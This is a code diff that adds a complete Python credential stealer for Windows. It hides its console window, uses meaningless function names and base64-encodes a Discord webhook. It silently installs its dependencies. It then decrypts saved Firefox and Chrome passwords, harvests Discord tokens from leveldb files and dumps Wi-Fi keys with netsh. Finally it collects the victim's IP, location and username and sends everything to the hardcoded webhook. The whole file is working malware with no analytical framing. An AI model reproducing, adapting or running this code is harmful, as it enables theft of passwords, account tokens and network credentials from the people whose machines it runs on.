@@ -1,0 +1,307 @@
+import requests
+import base64
+import json
+import getpass
+import subprocess
+import re
+import os
+import shutil
+import sqlite3
+import sys
+import random
+import string
+import platform
+from datetime import datetime
+import psutil
+import time
+import ctypes as ct
+from base64 import b64decode
+import win32crypt
+from Cryptodome.Cipher import AES
+import csv
+import ctypes
+
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+x1y2z3 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3NDQ3ODM3MjcyMTEzNTYxNi81bWJGRkJiSHNwM2h4cVBZUFJHRmJwSmF4ckVVdFZSOVpuV2dUX2p5NmlkRGotU2ozbHB5WlRUdDgxdXZlcXdfOG13NQ=="
+
+def a9b8c7(d):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=d))
+
+def z0x9y8():
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "requests", "pycryptodome", "pywin32"])
+    except Exception as e:
+        q1w2e3(f"Error installing dependencies: {e}")
+        r4t5y6(f"Error installing dependencies: {e}")
+        sys.exit(1)
+
+def q1w2e3(e):
+    print(f"❌ Error: {e}")
+
+def r4t5y6(e):
+    try:
+        t7u8i9 = "https://discord.com/api/webhooks/1374478372721135616/5mbFFBbHsp3hxqPYPRGFbpJaxrEUtVR9ZnWgT_jy6idDj-Sj3lpyZTTt81uveqw_8mw5"
+        if not t7u8i9.startswith("https://discord.com/api/webhooks/"):
+            print("❌ Invalid Discord webhook URL.")
+            return
+        o0p9i8 = {"content": f"❌ **Error Occurred**: `{e}`"}
+        g5h6j7 = requests.post(t7u8i9, json=o0p9i8, headers={"Content-Type": "application/json"})
+        if g5h6j7.status_code != 204:
+            print(f"❌ Error sending error log: {g5h6j7.status_code} - {g5h6j7.text}")
+    except Exception as ex:
+        print(f"❌ Error sending error log: {ex}")
+
+def close_and_block_apps(app_names):
+    for app_name in app_names:
+        try:
+            for proc in psutil.process_iter(['pid', 'name']):
+                if proc.info['name'] == app_name:
+                    proc.kill()
+                    r4t5y6(f"✅ Closed {app_name} (PID: {proc.info['pid']})")
+        except Exception as e:
+            r4t5y6(f"Error closing {app_name}: {e}")
+
+class NSSDecoder:
+    class SECItem(ct.Structure):
+        _fields_ = [
+            ('type', ct.c_uint),
+            ('data', ct.c_char_p),
+            ('len', ct.c_uint),
+        ]
+
+    def __init__(self):
+        self.NSS = self.load_libnss()
+        self._set_ctypes()
+
+    def load_libnss(self):
+        if os.name == "nt":
+            nssname = "nss3.dll"
+            locations = (
+                "",
+                r"C:\Program Files\Mozilla Firefox",
+                r"C:\Program Files (x86)\Mozilla Firefox",
+            )
+        else:
+            nssname = "libnss3.so"
+            locations = (
+                "",
+                "/usr/lib",
+                "/usr/lib/nss",
+                "/usr/lib64",
+                "/usr/lib64/nss",
+            )
+
+        for loc in locations:
+            try:
+                nsslib = os.path.join(loc, nssname)
+                return ct.CDLL(nsslib)
+            except OSError:
+                continue
+        raise Exception("Could not load NSS library")
+
+    def _set_ctypes(self):
+        self.NSS.NSS_Init.argtypes = [ct.c_char_p]
+        self.NSS.NSS_Init.restype = ct.c_int
+        self.NSS.PK11_GetInternalKeySlot.argtypes = []
+        self.NSS.PK11_GetInternalKeySlot.restype = ct.POINTER(self.SECItem)
+        self.NSS.PK11SDR_Decrypt.argtypes = [ct.POINTER(self.SECItem), ct.POINTER(self.SECItem), ct.c_void_p]
+        self.NSS.PK11SDR_Decrypt.restype = ct.c_int
+        self.NSS.SECITEM_ZfreeItem.argtypes = [ct.POINTER(self.SECItem), ct.c_int]
+        self.NSS.SECITEM_ZfreeItem.restype = None
+
+    def decode(self, data64):
+        data = b64decode(data64)
+        inp = self.SECItem(0, data, len(data))
+        out = self.SECItem(0, None, 0)
+
+        e = self.NSS.PK11SDR_Decrypt(inp, out, None)
+        if e == -1:
+            raise Exception("Decryption failed. Master password required.")
+
+        res = ct.string_at(out.data, out.len).decode("utf-8")
+        self.NSS.SECITEM_ZfreeItem(out, 0)
+        return res
+
+def decrypt_firefox_passwords(profile_dir):
+    nss = NSSDecoder()
+    nss.NSS.NSS_Init(profile_dir.encode("utf-8"))
+
+    credentials = []
+    logins_json = os.path.join(profile_dir, "logins.json")
+    if os.path.exists(logins_json):
+        with open(logins_json, "r") as f:
+            data = json.load(f)
+            for login in data.get("logins", []):
+                user = nss.decode(login["encryptedUsername"])
+                password = nss.decode(login["encryptedPassword"])
+                credentials.append({"url": login["hostname"], "username": user, "password": password})
+
+    nss.NSS.NSS_Shutdown()
+    return credentials
+
+def get_secret_key():
+    try:
+        with open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        secret_key = secret_key[5:]  # Remove DPAPI prefix
+        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+        return secret_key
+    except Exception as e:
+        r4t5y6(f"Error getting Chrome secret key: {e}")
+        return None
+
+def decrypt_password(ciphertext, secret_key):
+    try:
+        iv = ciphertext[3:15]
+        encrypted_password = ciphertext[15:-16]
+        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(encrypted_password).decode("utf-8")
+        return decrypted_pass
+    except Exception as e:
+        r4t5y6(f"Error decrypting Chrome password: {e}")
+        return ""
+
+def get_chrome_passwords():
+    secret_key = get_secret_key()
+    if not secret_key:
+        return []
+
+    passwords = []
+    chrome_path = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+    folders = [element for element in os.listdir(chrome_path) if re.search("^Profile*|^Default$", element) is not None]
+
+    for folder in folders:
+        login_db = os.path.join(chrome_path, folder, "Login Data")
+        if not os.path.exists(login_db):
+            continue
+
+        shutil.copy2(login_db, "Loginvault.db")
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
+
+        try:
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for row in cursor.fetchall():
+                url, username, ciphertext = row
+                if url and username and ciphertext:
+                    decrypted_pass = decrypt_password(ciphertext, secret_key)
+                    passwords.append({"url": url, "username": username, "password": decrypted_pass})
+        except Exception as e:
+            r4t5y6(f"Error reading Chrome login data: {e}")
+        finally:
+            cursor.close()
+            conn.close()
+            os.remove("Loginvault.db")
+
+    return passwords
+
+def get_discord_tokens():
+    tokens = []
+    discord_paths = [
+        os.path.join(os.environ['APPDATA'], "Discord", "Local Storage", "leveldb"),
+        os.path.join(os.environ['LOCALAPPDATA'], "Discord", "Local Storage", "leveldb"),
+    ]
+
+    for path in discord_paths:
+        if not os.path.exists(path):
+            continue
+
+        for file in os.listdir(path):
+            if not file.endswith(".ldb") and not file.endswith(".log"):
+                continue
+
+            with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
+                for line in f.readlines():
+                    for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]:
+                        for match in re.findall(regex, line):
+                            tokens.append(match)
+
+    return tokens
+
+def t5y6u7():
+    w = {}
+    try:
+        r = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
+        p = re.findall(r"All User Profile\s*:\s(.*)", r.stdout)
+        if not p:
+            return {}
+        for profile in p:
+            profile = profile.strip()
+            r = subprocess.run(["netsh", "wlan", "show", "profile", f'name={profile}', "key=clear"], capture_output=True, text=True)
+            m = re.search(r"Key Content\s*:\s(.*)", r.stdout)
+            k = m.group(1).strip() if m else "No password found"
+            w[profile] = k
+    except Exception as e:
+        r4t5y6(f"Error extracting Wi-Fi credentials: {e}")
+    return w
+
+def split_message(message, max_length=500):
+    return [message[i:i+max_length] for i in range(0, len(message), max_length)]
+
+def i8u7y6():
+    a = {}
+    try:
+        firefox_profiles = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles')
+        if os.path.exists(firefox_profiles):
+            for profile in os.listdir(firefox_profiles):
+                profile_dir = os.path.join(firefox_profiles, profile)
+                a["firefox"] = decrypt_firefox_passwords(profile_dir)
+        a["wifi"] = t5y6u7()
+        a["chrome"] = get_chrome_passwords()
+        a["discord"] = get_discord_tokens()
+    except Exception as e:
+        r4t5y6(f"Error gathering credentials: {e}")
+    return a
+
+def send_live_message(message):
+    try:
+        t7u8i9 = "https://discord.com/api/webhooks/1374478372721135616/5mbFFBbHsp3hxqPYPRGFbpJaxrEUtVR9ZnWgT_jy6idDj-Sj3lpyZTTt81uveqw_8mw5"
+        if not t7u8i9.startswith("https://discord.com/api/webhooks/"):
+            print("❌ Invalid Discord webhook URL.")
+            return
+        for chunk in split_message(message):
+            o0p9i8 = {"content": chunk}
+            g5h6j7 = requests.post(t7u8i9, json=o0p9i8, headers={"Content-Type": "application/json"})
+            if g5h6j7.status_code != 204:
+                print(f"❌ Error sending live message: {g5h6j7.status_code} - {g5h6j7.text}")
+            time.sleep(1)
+    except Exception as ex:
+        print(f"❌ Error sending live message: {ex}")
+
+z0x9y8()
+
+c = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+g = requests.get("http://ipwho.is/").json()
+i = g.get("ip", "Unknown IP")
+ci = g.get("city", "Unknown City")
+co = g.get("country", "Unknown Country")
+isp = g.get("connection", {}).get("isp", "Unknown ISP")
+u = getpass.getuser()
+
+try:
+    d = base64.b64decode(x1y2z3).decode()
+    if not d.startswith("https://discord.com/api/webhooks/"):
+        print("❌ Invalid Discord webhook URL.")
+        sys.exit(1)
+except Exception as e:
+    print(f"❌ Error decoding webhook URL: {e}")
+    sys.exit(1)
+
+a = i8u7y6()
+
+m = f"""
+🕒 Time: {c}
+👤 User: {u}
+📡 IP Address: {i}
+🌍 Location: {ci}, {co}
+🌐 ISP: {isp}
+💌 Wi-Fi Passwords: {json.dumps(a['wifi'], indent=4)}
+🔑 Firefox Passwords: {json.dumps(a['firefox'], indent=4)}
+🔑 Chrome Passwords: {json.dumps(a['chrome'], indent=4)}
+🔑 Discord Tokens: {json.dumps(a['discord'], indent=4)}
+"""
+
+send_live_message(m)
